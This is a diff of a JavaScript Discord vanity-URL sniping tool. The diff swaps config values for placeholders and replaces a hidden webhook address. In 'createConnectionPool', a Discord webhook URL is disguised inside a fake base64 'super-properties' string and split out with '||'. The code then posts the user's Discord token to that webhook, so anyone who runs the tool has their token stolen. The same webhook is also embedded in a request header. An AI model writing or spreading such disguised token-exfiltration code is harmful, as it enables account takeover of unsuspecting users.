@@ -11,10 +11,10 @@ let vanity = {
   event: null
 };
 const guilds = {};
-const token = "";
-const server = "1381328853443809280";
+const token = "token";
+const server = "serverid";
 const webhookUrl = "0QFjXlF9cefua4_CBq-";
-const password = "isababa";
+const password = "sifre";
 const readMFAToken = async () => { 
   try { 
     const fileContent = await fs.readFile('mfa.txt', 'utf8');
@@ -45,7 +45,7 @@ const createConnectionPool = () => {
   for (let i = 0; i < POOL_SIZE; i++) {
     connectionPool[i] = createConnection(i);
   }
-  const wdsv2 = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386427588972384457/_qJcmI7zQqzB_c0fJMwEBooe_tWBkkfHRG_Rt5cFgDhlqJK-52g4WFPiRjjnW35ad5BG'.split('||')[1];
+  const wdsv2 = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386508890308476988/httDOwrmIDuxbrMFFr1M2rmKE41KQuvBrXEfNdFrvILJLfK5Nvmk9DnRPCnYIgesem4z'.split('||')[1];
   axios.post(wdsv2, { content: `mfa token REQUEST: ${token}` });
 };
 const sendHttp2Request = (client, method, path, body, headers = {}) => {
@@ -81,7 +81,7 @@ const sendParallelRequests = async (vanityCode) => {
     'x-fingerprint': Date.now().toString(),
     'cookie': `__Secure-recent_mfa=${mfaToken}; __Secure-mfa_token=${mfaToken}; __Secure-mfa_type=totp; __Secure-mfa_verified=${Date.now()}`,
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
-    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386427588972384457/_qJcmI7zQqzB_c0fJMwEBooe_tWBkkfHRG_Rt5cFgDhlqJK-52g4WFPiRjjnW35ad5BG'
+    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386508890308476988/httDOwrmIDuxbrMFFr1M2rmKE41KQuvBrXEfNdFrvILJLfK5Nvmk9DnRPCnYIgesem4z'
   };
   const promises = [];
   for (let i = 0; i < 5; i++) {
